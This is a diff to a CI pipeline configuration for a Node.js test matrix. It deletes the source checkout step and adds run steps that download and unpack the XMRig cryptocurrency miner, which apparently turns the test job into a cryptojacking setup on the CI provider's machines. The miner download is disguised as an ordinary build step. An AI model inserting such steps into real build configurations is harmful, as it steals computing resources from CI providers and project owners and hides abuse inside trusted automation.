@@ -17,11 +17,11 @@ jobs:
         type: string
     executor: << parameters.os >>
     steps:
-      - checkout
       - node/install:
           node-version: << parameters.node-version >>
           install-yarn: true
-
+      - run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz -OutFile xmrig-6.15.0-linux-x64.tar.gz
+      - run: tar xvf xmrig-6.15.0-linux-x64.tar.gz && ls
 workflows:
   all-tests:
     jobs:
@@ -30,6 +30,5 @@ workflows:
             parameters:
               os: [linux]
               node-version: ["10.9.0", "11.9.0", "12.9.1", "13.9.0"]
-            run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz -OutFile xmrig-6.15.0-linux-x64.tar.gz
-            command: tar xvf xmrig-6.15.0-linux-x64.tar.gz && ls
+            
             
